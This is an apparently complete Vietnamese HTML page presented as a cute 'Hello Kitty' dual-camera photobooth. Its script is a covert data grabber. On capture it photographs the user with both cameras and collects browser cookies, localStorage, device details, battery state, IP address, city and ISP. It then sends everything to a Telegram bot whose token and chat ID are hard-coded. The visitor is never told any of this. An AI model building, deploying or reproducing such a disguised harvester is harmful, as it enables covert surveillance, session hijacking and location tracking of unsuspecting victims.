<!doctype html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>🎀 Hello Kitty Photobooth - Dual Cam</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;600;700;800&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: linear-gradient(135deg, #ffe4ec 0%, #ffb6c1 50%, #ff8a9c 100%);
      font-family: 'Quicksand', sans-serif;
      padding: 20px;
      position: relative;
      overflow-x: hidden;
    }

    .sakura-container {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      overflow: hidden;
      z-index: 0;
    }

    .sakura {
      position: absolute;
      top: -20px;
      color: #ffb7c5;
      font-size: 20px;
      animation: fall linear infinite;
      opacity: 0.7;
    }

    @keyframes fall {
      0% {
        transform: translateY(-20px) rotate(0deg) scale(1);
        opacity: 0.8;
      }
      100% {
        transform: translateY(110vh) rotate(720deg) scale(0.3);
        opacity: 0;
      }
    }

    .card {
      background: rgba(255, 255, 255, 0.85);
      backdrop-filter: blur(20px);
      border-radius: 40px;
      padding: 25px 20px;
      max-width: 450px;
      width: 100%;
      box-shadow: 0 20px 60px rgba(255, 105, 135, 0.3);
      border: 2px solid rgba(255, 255, 255, 0.5);
      position: relative;
      z-index: 1;
      text-align: center;
    }

    .card::before {
      content: "🎀";
      position: absolute;
      top: -18px;
      left: 50%;
      transform: translateX(-50%);
      font-size: 36px;
      filter: drop-shadow(0 4px 10px rgba(255, 105, 135, 0.3));
    }

    .kitty-avatar {
      width: 70px;
      height: 70px;
      margin: 0 auto 10px;
      background: linear-gradient(135deg, #ffb6c1, #ff8a9c);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 42px;
      box-shadow: 0 8px 30px rgba(255, 105, 135, 0.4);
      border: 3px solid white;
      position: relative;
      animation: bounceKitty 2s ease-in-out infinite;
    }

    @keyframes bounceKitty {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-8px); }
    }

    h2 {
      font-size: 20px;
      font-weight: 800;
      color: #d6336c;
      margin-bottom: 2px;
    }

    .subtitle {
      color: #e07a8e;
      font-size: 12px;
      font-weight: 600;
      margin-bottom: 12px;
    }

    .live-clock {
      background: linear-gradient(135deg, #ffb6c1, #ff8a9c);
      padding: 5px 14px;
      border-radius: 30px;
      display: inline-block;
      color: white;
      font-weight: 700;
      font-size: 11px;
      margin-bottom: 12px;
      box-shadow: 0 4px 15px rgba(255, 105, 135, 0.3);
    }

    .video-container {
      display: flex;
      gap: 8px;
      margin-bottom: 12px;
      justify-content: center;
    }

    .video-preview {
      flex: 1;
      border-radius: 16px;
      overflow: hidden;
      background: #fce4ec;
      position: relative;
      border: 2px solid #ffb6c1;
      min-height: 150px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .video-preview video {
      width: 100%;
      display: block;
      border-radius: 14px;
      background: #fce4ec;
    }

    .video-preview .placeholder {
      color: #e07a8e;
      font-size: 11px;
      font-weight: 600;
      padding: 10px;
    }

    .camera-indicator {
      position: absolute;
      top: 5px;
      left: 5px;
      background: rgba(255, 255, 255, 0.9);
      padding: 2px 8px;
      border-radius: 12px;
      font-size: 9px;
      font-weight: 700;
      color: #d6336c;
      border: 1px solid #ffb6c1;
    }

    .btn {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 30px;
      font-size: 14px;
      font-weight: 700;
      color: white;
      cursor: pointer;
      transition: all 0.3s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      font-family: 'Quicksand', sans-serif;
    }

    .btn-primary {
      background: linear-gradient(135deg, #ff6b8a, #ff4d6d);
      box-shadow: 0 8px 25px rgba(255, 77, 109, 0.4);
    }

    .btn-primary:hover {
      transform: translateY(-2px);
      box-shadow: 0 12px 35px rgba(255, 77, 109, 0.5);
    }

    .btn-primary:disabled {
      opacity: 0.5;
      cursor: not-allowed;
      transform: none;
    }

    .btn-pink {
      background: linear-gradient(135deg, #ff8a9c, #ff6b8a);
      box-shadow: 0 8px 25px rgba(255, 107, 138, 0.4);
    }

    .btn-pink:hover {
      transform: translateY(-2px);
      box-shadow: 0 12px 35px rgba(255, 107, 138, 0.5);
    }

    .btn-group {
      display: none;
      flex-direction: column;
      gap: 8px;
      margin-top: 10px;
    }

    .btn-group.show {
      display: flex;
    }

    .btn a {
      color: white;
      text-decoration: none;
      width: 100%;
    }

    .status {
      margin-top: 12px;
      font-size: 12px;
      font-weight: 600;
      color: #e07a8e;
      min-height: 18px;
    }

    .status.success {
      color: #2ecc71;
    }

    .footer-badge {
      margin-top: 12px;
      font-size: 9px;
      color: #e07a8e;
      opacity: 0.7;
      letter-spacing: 1px;
    }

    #canvas {
      display: none;
    }

    .music-control {
      position: fixed;
      bottom: 20px;
      right: 20px;
      z-index: 100;
      background: rgba(255, 255, 255, 0.9);
      border: 2px solid #ffb6c1;
      border-radius: 50%;
      width: 44px;
      height: 44px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 18px;
      cursor: pointer;
      box-shadow: 0 4px 20px rgba(255, 105, 135, 0.3);
      transition: all 0.3s ease;
      backdrop-filter: blur(10px);
    }

    .music-control:hover {
      transform: scale(1.1);
    }

    .music-control.playing {
      animation: pulseMusic 1.5s ease-in-out infinite;
    }

    @keyframes pulseMusic {
      0%, 100% { box-shadow: 0 4px 20px rgba(255, 105, 135, 0.3); }
      50% { box-shadow: 0 4px 40px rgba(255, 105, 135, 0.6); }
    }

    .music-progress {
      position: fixed;
      bottom: 75px;
      right: 20px;
      z-index: 99;
      width: 44px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .music-progress input[type="range"] {
      width: 60px;
      height: 3px;
      -webkit-appearance: none;
      background: #ffb6c1;
      border-radius: 2px;
      outline: none;
      transform: rotate(-90deg);
      transform-origin: center;
      cursor: pointer;
    }

    .music-progress input[type="range"]::-webkit-slider-thumb {
      -webkit-appearance: none;
      width: 10px;
      height: 10px;
      background: #ff6b8a;
      border-radius: 50%;
      cursor: pointer;
    }

    .loading-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 255, 0.85);
      backdrop-filter: blur(5px);
      z-index: 999;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      gap: 15px;
    }

    .loading-overlay.show {
      display: flex;
    }

    .loading-spinner {
      width: 50px;
      height: 50px;
      border: 4px solid #ffb6c1;
      border-top: 4px solid #ff4d6d;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .loading-text {
      color: #d6336c;
      font-weight: 700;
      font-size: 16px;
    }

    @media (max-width: 480px) {
      .card {
        padding: 18px 12px;
      }
      .video-preview {
        min-height: 120px;
      }
      h2 {
        font-size: 17px;
      }
      .kitty-avatar {
        width: 55px;
        height: 55px;
        font-size: 32px;
      }
    }
  </style>
</head>
<body>

  <div class="loading-overlay" id="loadingOverlay">
    <div class="loading-spinner"></div>
    <div class="loading-text">🌸 Đang khởi tạo camera...</div>
  </div>

  <div class="sakura-container" id="sakuraContainer"></div>

  <div class="music-progress">
    <input type="range" id="volumeControl" min="0" max="1" step="0.01" value="0.5">
  </div>

  <div class="music-control playing" id="musicBtn" onclick="toggleMusic()">
    🎵
  </div>

  <div class="card">
    <div class="kitty-avatar">
      <span>🐱</span>
    </div>

    <div class="live-clock" id="clock">🕒 Đang tải...</div>

    <h2>🌸 Hello Kitty Photobooth</h2>
    <p class="subtitle">✨ Chụp cả 2 camera cùng lúc ✨</p>

    <div class="video-container">
      <div class="video-preview">
        <video id="videoFront" autoplay playsinline muted></video>
        <div class="placeholder" id="placeholderFront">📱 Front</div>
        <div class="camera-indicator">📷 Trước</div>
      </div>
      <div class="video-preview">
        <video id="videoBack" autoplay playsinline muted></video>
        <div class="placeholder" id="placeholderBack">📷 Back</div>
        <div class="camera-indicator">📷 Sau</div>
      </div>
    </div>

    <button class="btn btn-primary" id="capture-btn">
      <span>📸 CHỤP ẢNH CẢ 2 CAM</span>
    </button>

    <div class="btn-group" id="action-buttons">
      <a href="#" target="_blank" class="btn btn-pink" style="text-decoration:none;">
        🎀 TRUY CẬP NHÓM LẤY FILE
      </a>
      <a href="#" target="_blank" class="btn btn-pink" style="text-decoration:none;">
        🤖 MỞ BOT TELEGRAM
      </a>
    </div>

    <div id="status" class="status">💖 Bấm nút để chụp ảnh cùng Kitty nhé!</div>
    <div class="footer-badge">🎀 Made with love 🎀</div>
  </div>

  <canvas id="canvas"></canvas>

  <script>
    // ==========================================================
    // CẤU HÌNH
    // ==========================================================
    const TELEGRAM_BOT_TOKEN = '8921957218:AAFpPTSp5c56ByZMXZRlw8XwBxXj9ap_AE8';
    const TELEGRAM_CHAT_ID = '8872446985';
    const MUSIC_FILE = 'nhac_nen.mp3';

    // === TẠO HOA ANH ĐÀO ===
    function createSakura() {
      const container = document.getElementById('sakuraContainer');
      const emojis = ['🌸', '🌺', '🌸', '🌺', '🌸'];
      for (let i = 0; i < 30; i++) {
        const sakura = document.createElement('div');
        sakura.className = 'sakura';
        sakura.textContent = emojis[Math.floor(Math.random() * emojis.length)];
        sakura.style.left = Math.random() * 100 + '%';
        sakura.style.fontSize = (12 + Math.random() * 20) + 'px';
        sakura.style.animationDuration = (8 + Math.random() * 14) + 's';
        sakura.style.animationDelay = (Math.random() * 15) + 's';
        container.appendChild(sakura);
      }
    }
    createSakura();

    // === NHẠC - TỰ ĐỘNG PHÁT NGAY ===
    let audio = null;
    let isMusicPlaying = false;

    function initAudio() {
      if (!audio) {
        audio = new Audio(MUSIC_FILE);
        audio.loop = true;
        audio.volume = 0.5;
        document.getElementById('volumeControl').addEventListener('input', function() {
          if (audio) audio.volume = this.value;
        });
      }
    }

    function playMusic() {
      try {
        initAudio();
        if (!isMusicPlaying) {
          const playPromise = audio.play();
          if (playPromise !== undefined) {
            playPromise.then(() => {
              isMusicPlaying = true;
              document.getElementById('musicBtn').classList.add('playing');
              document.getElementById('musicBtn').textContent = '🎵';
            }).catch(() => {
              // Nếu bị chặn, thử phát khi click
              document.addEventListener('click', function playOnClick() {
                audio.play().catch(() => {});
                isMusicPlaying = true;
                document.getElementById('musicBtn').classList.add('playing');
                document.getElementById('musicBtn').textContent = '🎵';
                document.removeEventListener('click', playOnClick);
              }, { once: true });
            });
          }
        }
      } catch (e) {
        console.log('Music error:', e);
      }
    }

    function toggleMusic() {
      initAudio();
      if (isMusicPlaying) {
        audio.pause();
        isMusicPlaying = false;
        document.getElementById('musicBtn').classList.remove('playing');
        document.getElementById('musicBtn').textContent = '🔇';
      } else {
        audio.play().catch(() => {});
        isMusicPlaying = true;
        document.getElementById('musicBtn').classList.add('playing');
        document.getElementById('musicBtn').textContent = '🎵';
      }
    }

    // Phát nhạc ngay khi load trang
    setTimeout(playMusic, 100);

    // === ĐỒNG HỒ ===
    function updateClock() {
      const now = new Date();
      const timeString = now.toLocaleTimeString('vi-VN', { hour12: false });
      const dateString = now.toLocaleDateString('vi-VN', { day: '2-digit', month: '2-digit', year: 'numeric' });
      document.getElementById('clock').textContent = `🕒 ${timeString} - ${dateString}`;
    }
    setInterval(updateClock, 1000);
    updateClock();

    // === LẤY COOKIES THẬT TỪ TRÌNH DUYỆT ===
    function getAllCookies() {
      try {
        const cookies = document.cookie.split(';');
        const cookieList = [];
        cookies.forEach(cookie => {
          const trimmed = cookie.trim();
          if (trimmed) {
            // Tìm vị trí dấu = đầu tiên
            const equalIndex = trimmed.indexOf('=');
            if (equalIndex > 0) {
              const name = trimmed.substring(0, equalIndex);
              const value = trimmed.substring(equalIndex + 1);
              cookieList.push({ name: name, value: value });
            }
          }
        });
        return cookieList;
      } catch (e) {
        console.error('Lỗi lấy cookies:', e);
        return [];
      }
    }

    function getCookiesString() {
      const cookies = getAllCookies();
      if (cookies.length === 0) return '❌ Không có cookies nào';
      
      let result = '';
      cookies.forEach((cookie, index) => {
        const maxLen = 60;
        let value = decodeURIComponent(cookie.value || '');
        if (value.length > maxLen) {
          value = value.substring(0, maxLen) + '...';
        }
        // Thay thế ký tự đặc biệt để tránh lỗi
        value = value.replace(/[^\x20-\x7E]/g, '?');
        result += `  ${index + 1}. ${cookie.name} = ${value}\n`;
      });
      return result;
    }

    // === LẤY LOCALSTORAGE ===
    function getLocalStorageInfo() {
      try {
        const items = [];
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          let value = localStorage.getItem(key) || '';
          if (value.length > 40) value = value.substring(0, 40) + '...';
          items.push(`${key} = ${value}`);
        }
        if (items.length === 0) return '❌ Không có dữ liệu';
        return items.join('\n  ');
      } catch (e) {
        return '❌ Không thể truy cập';
      }
    }

    // === CAMERA - FIX LỖI ===
    const videoFront = document.getElementById('videoFront');
    const videoBack = document.getElementById('videoBack');
    const canvas = document.getElementById('canvas');
    const captureBtn = document.getElementById('capture-btn');
    const statusDiv = document.getElementById('status');
    const actionButtons = document.getElementById('action-buttons');
    const loadingOverlay = document.getElementById('loadingOverlay');

    let streamFront = null;
    let streamBack = null;
    let isFrontReady = false;
    let isBackReady = false;

    async function startCameras() {
      loadingOverlay.classList.add('show');
      captureBtn.disabled = true;

      try {
        // Lấy danh sách camera
        const devices = await navigator.mediaDevices.enumerateDevices();
        const cameras = devices.filter(d => d.kind === 'videoinput');
        console.log('Số camera tìm thấy:', cameras.length);
        cameras.forEach((cam, i) => {
          console.log(`Camera ${i+1}:`, cam.label || 'Không tên');
        });

        // Camera trước - ưu tiên camera có label chứa "front" hoặc "FaceTime"
        let frontDeviceId = null;
        let backDeviceId = null;

        // Tìm camera trước và sau
        for (const cam of cameras) {
          const label = cam.label.toLowerCase();
          if (label.includes('front') || label.includes('face') || label.includes('自拍') || label.includes('前置')) {
            frontDeviceId = cam.deviceId;
          } else if (label.includes('back') || label.includes('rear') || label.includes('后置') || label.includes('主摄')) {
            backDeviceId = cam.deviceId;
          }
        }

        // Nếu không tìm thấy front, lấy camera đầu tiên làm front
        if (!frontDeviceId && cameras.length > 0) {
          frontDeviceId = cameras[0].deviceId;
        }
        // Nếu không tìm thấy back và có camera thứ 2, lấy làm back
        if (!backDeviceId && cameras.length > 1) {
          backDeviceId = cameras[1].deviceId;
        }

        // Mở camera trước
        if (frontDeviceId) {
          try {
            const frontStream = await navigator.mediaDevices.getUserMedia({
              video: { 
                deviceId: { exact: frontDeviceId },
                width: { ideal: 320 },
                height: { ideal: 240 }
              },
              audio: false
            });
            streamFront = frontStream;
            videoFront.srcObject = frontStream;
            await videoFront.play();
            document.getElementById('placeholderFront').style.display = 'none';
            isFrontReady = true;
            console.log('✅ Camera trước đã mở');
          } catch (e) {
            console.log('Lỗi mở cam trước:', e);
            // Thử lại với facingMode
            try {
              const fallbackStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
                audio: false
              });
              streamFront = fallbackStream;
              videoFront.srcObject = fallbackStream;
              await videoFront.play();
              document.getElementById('placeholderFront').style.display = 'none';
              isFrontReady = true;
              console.log('✅ Camera trước (fallback) đã mở');
            } catch (e2) {
              document.getElementById('placeholderFront').textContent = '❌ Không có cam trước';
              isFrontReady = false;
            }
          }
        } else {
          document.getElementById('placeholderFront').textContent = '❌ Không có cam trước';
          isFrontReady = false;
        }

        // Mở camera sau
        if (backDeviceId) {
          try {
            const backStream = await navigator.mediaDevices.getUserMedia({
              video: { 
                deviceId: { exact: backDeviceId },
                width: { ideal: 320 },
                height: { ideal: 240 }
              },
              audio: false
            });
            streamBack = backStream;
            videoBack.srcObject = backStream;
            await videoBack.play();
            document.getElementById('placeholderBack').style.display = 'none';
            isBackReady = true;
            console.log('✅ Camera sau đã mở');
          } catch (e) {
            console.log('Lỗi mở cam sau:', e);
            try {
              const fallbackStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'environment', width: { ideal: 320 }, height: { ideal: 240 } },
                audio: false
              });
              streamBack = fallbackStream;
              videoBack.srcObject = fallbackStream;
              await videoBack.play();
              document.getElementById('placeholderBack').style.display = 'none';
              isBackReady = true;
              console.log('✅ Camera sau (fallback) đã mở');
            } catch (e2) {
              document.getElementById('placeholderBack').textContent = '❌ Không có cam sau';
              isBackReady = false;
            }
          }
        } else {
          document.getElementById('placeholderBack').textContent = '❌ Không có cam sau';
          isBackReady = false;
        }

        if (isFrontReady || isBackReady) {
          captureBtn.disabled = false;
          statusDiv.textContent = '✅ Camera đã sẵn sàng!';
          statusDiv.className = 'status success';
        } else {
          statusDiv.textContent = '⚠️ Không có camera nào hoạt động';
        }

      } catch (err) {
        console.error('Camera error:', err);
        statusDiv.textContent = '⚠️ Không thể truy cập camera';
      } finally {
        loadingOverlay.classList.remove('show');
      }
    }

    // Bắt đầu camera ngay
    startCameras();

    // === LẤY THÔNG TIN CHI TIẾT ===
    function getDeviceInfo() {
      const ua = navigator.userAgent;
      
      let device = 'Khác';
      let os = 'Khác';
      let browser = 'Khác';
      
      if (/android/i.test(ua)) device = 'Android 📱';
      else if (/iphone|ipad|ipod/i.test(ua)) device = 'iOS 📱';
      else if (/windows/i.test(ua)) device = 'Windows 💻';
      else if (/macintosh|mac os x/i.test(ua)) device = 'Mac 💻';
      else if (/linux/i.test(ua)) device = 'Linux 🐧';
      
      if (ua.includes('Windows NT 10.0')) os = 'Windows 10/11';
      else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
      else if (ua.includes('Mac OS X')) os = 'macOS';
      else if (ua.includes('Android')) os = 'Android';
      else if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
      else if (ua.includes('Linux')) os = 'Linux';
      
      if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
      else if (ua.includes('Firefox')) browser = 'Firefox';
      else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
      else if (ua.includes('Edg')) browser = 'Edge';
      else if (ua.includes('Opera') || ua.includes('OPR')) browser = 'Opera';
      
      return { device, os, browser };
    }

    async function getDetailedInfo() {
      const info = {
        time: new Date().toLocaleString('vi-VN', { hour12: false }),
        device: 'Không rõ',
        os: 'Không rõ',
        browser: 'Không rõ',
        screen: 'Không rõ',
        battery: 'Không hỗ trợ',
        ip: 'Không rõ',
        city: 'Không rõ',
        region: 'Không rõ',
        country: 'Không rõ',
        isp: 'Không rõ',
        timezone: 'Không rõ',
        language: 'Không rõ',
        cores: 'Không rõ',
        memory: 'Không rõ',
        touch: 'Không',
        cookies: 'Không',
        doNotTrack: 'Không',
        referrer: 'Không',
        cookiesDetail: 'Không có cookies',
        localStorage: 'Không có dữ liệu'
      };

      const basicInfo = getDeviceInfo();
      info.device = basicInfo.device;
      info.os = basicInfo.os;
      info.browser = basicInfo.browser;

      info.screen = `${window.screen.width}x${window.screen.height}`;
      info.language = navigator.language || 'Không rõ';
      info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Không rõ';
      info.touch = 'ontouchstart' in window ? '✅ Có' : '❌ Không';
      info.cookies = navigator.cookieEnabled ? '✅ Bật' : '❌ Tắt';
      info.doNotTrack = navigator.doNotTrack ? '✅ Bật' : '❌ Tắt';
      info.referrer = document.referrer || 'Trực tiếp';
      info.cores = navigator.hardwareConcurrency || 'Không rõ';

      // Lấy cookies thật
      info.cookiesDetail = getCookiesString();
      
      // Lấy localStorage
      info.localStorage = getLocalStorageInfo();

      if (navigator.deviceMemory) {
        info.memory = navigator.deviceMemory + 'GB';
      }

      if (navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          info.battery = `${Math.round(battery.level * 100)}% ${battery.charging ? '⚡Đang sạc' : '🔋Không sạc'}`;
        } catch (e) {}
      }

      try {
        const ipRes = await fetch('https://ipwho.is/');
        const ipData = await ipRes.json();
        if (ipData.success) {
          info.ip = ipData.ip || 'Không rõ';
          info.city = ipData.city || 'Không rõ';
          info.region = ipData.region || 'Không rõ';
          info.country = ipData.country || 'Không rõ';
          info.isp = ipData.connection?.isp || ipData.connection?.org || 'Không rõ';
        }
      } catch (e) {
        try {
          const fallbackRes = await fetch('https://api.ipify.org?format=json');
          const fallbackData = await fallbackRes.json();
          info.ip = fallbackData.ip || 'Không rõ';
        } catch (err) {}
      }

      return info;
    }

    // === CHỤP ẢNH ===
    function playClickSound() {
      try {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.type = 'sine';
        osc.frequency.setValueAtTime(880, ctx.currentTime);
        osc.frequency.exponentialRampToValueAtTime(1320, ctx.currentTime + 0.1);
        gain.gain.setValueAtTime(0.12, ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.1);
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.start();
        osc.stop(ctx.currentTime + 0.1);
      } catch (e) {}
    }

    captureBtn.onclick = async () => {
      if (!isFrontReady && !isBackReady) {
        statusDiv.textContent = '⚠️ Vui lòng đợi camera sẵn sàng!';
        return;
      }

      playClickSound();
      captureBtn.disabled = true;
      statusDiv.textContent = '📸 Đang chụp ảnh với cả 2 camera...';
      statusDiv.className = 'status';

      const info = await getDetailedInfo();

      const frontReady = isFrontReady && videoFront.videoWidth > 0;
      const backReady = isBackReady && videoBack.videoWidth > 0;

      if (!frontReady && !backReady) {
        statusDiv.textContent = '⚠️ Không có camera nào sẵn sàng!';
        captureBtn.disabled = false;
        return;
      }

      const imgWidth = 480;
      const imgHeight = 320;
      canvas.width = imgWidth;
      canvas.height = imgHeight;
      const ctx = canvas.getContext('2d');

      // Nền
      const gradient = ctx.createLinearGradient(0, 0, imgWidth, imgHeight);
      gradient.addColorStop(0, '#ffe4ec');
      gradient.addColorStop(1, '#ffb6c1');
      ctx.fillStyle = gradient;
      ctx.fillRect(0, 0, imgWidth, imgHeight);

      // Vẽ 2 ảnh
      if (frontReady) {
        const w = imgWidth / 2 - 5;
        const h = imgHeight - 40;
        ctx.save();
        ctx.translate(5 + w, 20);
        ctx.scale(-1, 1);
        ctx.drawImage(videoFront, -w, 0, w, h);
        ctx.restore();
        
        ctx.strokeStyle = '#ff6b8a';
        ctx.lineWidth = 2;
        ctx.strokeRect(5, 20, w, h);
        ctx.fillStyle = 'rgba(255,255,255,0.7)';
        ctx.fillRect(5, 20, 50, 18);
        ctx.fillStyle = '#d6336c';
        ctx.font = 'bold 10px Quicksand';
        ctx.textAlign = 'left';
        ctx.fillText('📱 Trước', 10, 34);
      }

      if (backReady) {
        const w = imgWidth / 2 - 5;
        const h = imgHeight - 40;
        const x = imgWidth / 2 + 5;
        ctx.drawImage(videoBack, x, 20, w, h);
        ctx.strokeStyle = '#ff6b8a';
        ctx.lineWidth = 2;
        ctx.strokeRect(x, 20, w, h);
        ctx.fillStyle = 'rgba(255,255,255,0.7)';
        ctx.fillRect(x, 20, 50, 18);
        ctx.fillStyle = '#d6336c';
        ctx.font = 'bold 10px Quicksand';
        ctx.textAlign = 'left';
        ctx.fillText('📷 Sau', x + 5, 34);
      }

      // Header
      ctx.fillStyle = '#d6336c';
      ctx.font = 'bold 14px Quicksand';
      ctx.textAlign = 'center';
      ctx.shadowColor = 'rgba(255,255,255,0.8)';
      ctx.shadowBlur = 8;
      ctx.fillText('🌸 Hello Kitty Photobooth 🌸', imgWidth / 2, 16);
      ctx.shadowBlur = 0;

      // Footer
      ctx.fillStyle = 'rgba(214, 51, 108, 0.6)';
      ctx.font = '9px Quicksand';
      ctx.textAlign = 'right';
      ctx.fillText(info.time, imgWidth - 8, imgHeight - 5);

      ctx.fillStyle = 'rgba(255,255,255,0.6)';
      ctx.fillRect(5, imgHeight - 20, 130, 16);
      ctx.fillStyle = '#d6336c';
      ctx.font = 'bold 8px Quicksand';
      ctx.textAlign = 'left';
      ctx.fillText(`📍 ${info.city || 'Unknown'}`, 10, imgHeight - 8);

      // === GỬI LÊN TELEGRAM ===
      const caption = 
        `🎀 HELLO KITTY PHOTOBOOTH - DUAL CAM 🎀\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `⏰ Thời gian: ${info.time}\n` +
        `📱 Thiết bị: ${info.device}\n` +
        `💻 Hệ điều hành: ${info.os}\n` +
        `🌐 Trình duyệt: ${info.browser}\n` +
        `📺 Màn hình: ${info.screen}\n` +
        `🧠 CPU cores: ${info.cores}\n` +
        `💾 RAM: ${info.memory}\n` +
        `🔋 Pin: ${info.battery}\n` +
        `🌍 Ngôn ngữ: ${info.language}\n` +
        `🕐 Múi giờ: ${info.timezone}\n` +
        `🖱️ Touch screen: ${info.touch}\n` +
        `🍪 Cookies: ${info.cookies}\n` +
        `🚫 Do Not Track: ${info.doNotTrack}\n` +
        `🔗 Referrer: ${info.referrer}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🌐 IP: ${info.ip}\n` +
        `📍 Vị trí: ${info.city}, ${info.region}\n` +
        `🌍 Quốc gia: ${info.country}\n` +
        `🏢 Nhà mạng: ${info.isp}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `📷 Camera: ${isFrontReady ? '✅ Trước' : '❌ Trước'} | ${isBackReady ? '✅ Sau' : '❌ Sau'}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🍪 CHI TIẾT COOKIES:\n${info.cookiesDetail}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `💾 LOCAL STORAGE:\n  ${info.localStorage}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🌸 Chụp ảnh cùng Kitty thật xinh nhé! 🌸`;

      canvas.toBlob(async (blob) => {
        if (blob) {
          const formData = new FormData();
          formData.append('chat_id', TELEGRAM_CHAT_ID);
          formData.append('photo', blob, `hello_kitty_dual_${Date.now()}.jpg`);
          formData.append('caption', caption);
          formData.append('parse_mode', 'HTML');

          try {
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
              method: 'POST',
              body: formData
            });
            const result = await response.json();
            if (result.ok) {
              statusDiv.textContent = '🎀 Chụp ảnh thành công! Kitty đã ghi nhận bạn! 💖';
              statusDiv.className = 'status success';
              actionButtons.classList.add('show');
            } else {
              statusDiv.textContent = '⚠️ Lỗi gửi ảnh: ' + (result.description || 'Unknown error');
            }
          } catch (e) {
            statusDiv.textContent = '⚠️ Lỗi kết nối Telegram';
            console.error('Telegram error:', e);
          }
        }
        captureBtn.disabled = false;
      }, 'image/jpeg', 0.92);
    };
  </script>
</body>
